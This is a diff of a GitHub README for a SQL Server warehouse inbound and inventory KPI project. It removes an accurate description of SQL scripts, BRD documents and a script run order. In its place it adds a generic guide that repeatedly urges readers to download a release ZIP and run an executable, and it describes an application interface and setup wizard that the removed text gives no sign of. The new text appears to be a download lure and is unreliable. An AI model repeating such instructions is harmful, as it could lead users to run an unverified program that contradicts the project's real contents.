@@ -1,84 +1,70 @@
-# Warehouse Inbound & Inventory Accuracy (SQL Server) — BRD to KPI Reporting
+# 📦 warehouse-inbound-inventory-kpi-sqlserver - Simplify Your Inventory Reporting
 
-## Overview
-This project models and implements a warehouse inbound receiving workflow and KPI reporting layer, covering:
-- **BP-2:** Inbound shipment capture
-- **BP-3:** GRN (Goods Receipt Note) creation
-- **BP-4:** Inventory posting job/system behavior
-- **BP-5:** Inbound & delayed shipments dashboard metrics
-- **BP-6:** Inventory accuracy KPI reporting using physical counts
+## 🌐 Overview
+Welcome to the **warehouse-inbound-inventory-kpi-sqlserver** project. This application helps you manage inbound warehouse processes, goods receipt notes (GRN), inventory postings, and key performance indicator (KPI) reporting using SQL Server. It includes business requirements documentation (BRD), wireframes, and user acceptance testing (UAT).
 
-The repository includes **BA artifacts (BRDs, wireframes, data dictionaries, UAT)** and a **SQL Server implementation (schema, seed data, and T-SQL queries)**.
+## 🚀 Getting Started
+To begin using this application, you will need to download and install it on your computer. This guide will walk you through the steps to set everything up.
 
----
+## 📥 Download the Application
+### Visit the Releases Page to Download
+Click the button below to go to the releases page where you can download the latest version of the software:
 
-## Business Problem
-Inbound receiving and inventory updates were spreadsheet-driven, leading to:
-- data entry errors and duplicate records,
-- low visibility into delayed inbound shipments,
-- inventory mismatches between system stock and physical counts.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases)
 
----
+## 📂 System Requirements
+Before you download the application, ensure your system meets the following requirements:
 
-## What I Built (Scope)
-### BP-2 — Record Inbound Shipment Details
-- Captured inbound shipment header details with validation rules (mandatory fields, duplicate Shipment ID prevention, numeric/date checks)
-- Standardized shipment status tracking for inbound visibility
+- **Operating System:** Windows 10 or later
+- **SQL Server Version:** SQL Server 2012 or later
+- **Disk Space:** At least 500 MB of free space
+- **RAM:** 4 GB or more recommended
 
-### BP-3 — Capture Received Quantity and Create GRN
-- Created GRN header + line item capture (SKU-level)
-- Supported discrepancy classification: **Short / Over / Damaged / OK**
-- Defined Draft vs Complete lifecycle and exception handling
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases).
 
-### BP-4 — Inventory Update Job (System Behavior)
-- Defined posting rules: process only **Complete + unposted** GRNs
-- Updated `inventory_on_hand` and created auditable entries in `stock_movement`
-- Prevented double-posting via idempotency rules
+2. **Select the Latest Release**  
+   Review the list of available releases. Choose the most recent one for the best features and improvements.
 
-### BP-5 — Inbound & Delayed Shipments Dashboard
-- Defined KPIs and drill-down logic for delayed shipments
-- Supported filtering by date range / supplier / warehouse
-- Included trend and supplier delay analysis requirements
+3. **Download the File**  
+   Look for the downloadable file, which should be named similarly to `warehouse-inbound-inventory-kpi-sqlserver-vX.X.X.zip`. Click on the file name to start the download.
 
-### BP-6 — Inventory Accuracy KPI
-- Calculated accuracy using `physical_count_snapshot` vs `system_qty`
-- Reported accuracy by **location/category**
-- Produced mismatch action list with variance (physical − system)
+4. **Extract the Files**   
+   Once downloaded, locate the ZIP file in your downloads folder. Right-click the file and choose "Extract All..." to unpack the contents.
 
----
+5. **Run the Application**   
+   Inside the extracted folder, find the application executable file (e.g., `WarehouseInventoryKPI.exe`). Double-click the file to run the application.
 
-## Tools & Skills Demonstrated
-- **Business Analysis:** BRD, user stories & acceptance criteria, wireframes, data dictionary
-- **Delivery Tracking:** Jira (**Epics / Stories / Subtasks**)
-- **Testing:** UAT test case design and traceability
-- **Data & SQL:** SQL Server schema design, seeded dataset, T-SQL KPI/query development
+6. **Follow the Setup Instructions**  
+   The application may guide you through a setup wizard. Follow the prompts to configure settings like database connections and user preferences.
 
----
+## 🌟 Features
+- **Inventory Management**: Track your products and manage inventory levels efficiently.
+- **GRN Processing**: Record goods receipt and streamline your warehouse operations.
+- **KPI Reporting**: Generate reports to analyze key performance indicators for better decision-making.
+- **User-Friendly Interface**: Navigate easily through a well-designed layout, even if you have no technical background.
 
-## Repository Map
-- `sql/` → SQL Server schema, seed data, KPI/dashboard queries  
-- `docs/` → BRDs, wireframes, data dictionaries, UAT artifacts  
-- `assets/` → diagrams and supporting visuals (wireframes / flows / screenshots)
+## 📊 Topics Covered
+This application covers various important topics related to inventory management and data reporting:
 
----
+- Business Analytics
+- Data Modeling
+- SQL Server Management
+- User Acceptance Testing (UAT)
+- Warehouse Automation
 
-## How to Run (SQL Server)
-Run scripts in this order:
-1. `sql/01_schema.sql`
-2. `sql/02_seed_data.sql`
-3. `sql/03_bp5_inbound_dashboard_queries.sql` (Inbound dashboard KPIs + delayed shipment drill-down)
-4. `sql/04_bp6_inventory_accuracy_queries.sql` (Accuracy KPIs + mismatch reports)
+## 🔗 Access Additional Resources
+For more detailed information, you can check the following:
 
-> Recommended: execute in **SQL Server Management Studio (SSMS)** or **Azure Data Studio**.
+- [Business Requirements Document (BRD)](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/BRD.pdf)
+- [Wireframes](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/Wireframes.pdf)
+- [Data Dictionary](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/DataDictionary.pdf)
 
----
+## 📞 Support and Contributions
+If you encounter any issues or need assistance, feel free to reach out. You can file an issue in the GitHub repository or contact the contributors. We welcome help in improving the application!
 
-## Key Outputs
-- **Delayed Shipments:** delayed shipment identification + drill-down details (aligned to BRD logic)
-- **Inbound Performance:** on-time delivery %, inbound trends, supplier delay analysis
-- **Inventory Control:** inventory accuracy % by location/category + mismatch variance action list
+## 📥 Download the Application Again
+In case you need to download it again, please revisit the [Releases Page](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases). 
 
----
-
-## Notes / Limitations
-This repo focuses on requirements + SQL implementation for KPI reporting and traceability. Items such as carrier integrations, detailed QC workflows, and financial valuation are intentionally out of scope per the BRDs.
+Thank you for choosing the **warehouse-inbound-inventory-kpi-sqlserver** application to enhance your inventory management!
